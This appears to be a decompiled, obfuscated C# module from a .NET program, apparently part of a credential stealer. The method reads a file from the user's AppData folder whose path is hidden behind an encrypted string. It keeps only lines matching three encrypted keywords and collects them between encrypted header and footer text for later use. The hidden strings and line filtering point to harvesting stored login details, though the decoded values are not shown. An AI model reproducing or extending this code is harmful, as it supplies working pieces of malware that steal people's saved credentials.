using System;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;

namespace ns4;

internal class Class31
{
	public class Class32
	{
		public static void smethod_0()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("hnPAzLuasbWzqo2ov8y3nrh+z7aWHQ==", "False");
				string text2 = Conversions.ToString(1);
				text2 = ((ServerComputer)Class2.smethod_0()).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
				string text3 = Class6.smethod_0("aYSPlohphI+WiGmEosKykLDAlohphI+WiGmEj5aIaYQc", "False") + Environment.NewLine + Environment.NewLine;
				string[] array = text2.Split(new char[1] { '\r' });
				text2 = null;
				string[] array2 = array;
				foreach (string text4 in array2)
				{
					if (text4.Contains(Class6.smethod_0("d8bT186qudDUmAs=", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine;
					}
					if (text4.Contains(Class6.smethod_0("Y7CuwatlIA==", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine;
					}
					if (text4.Contains(Class6.smethod_0("dMO/2MqvwtDJlQ4=", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine + Environment.NewLine;
					}
				}
				string_0 = text3 + Environment.NewLine + Environment.NewLine + Class6.smethod_0("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4Ie", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string string_0;
}
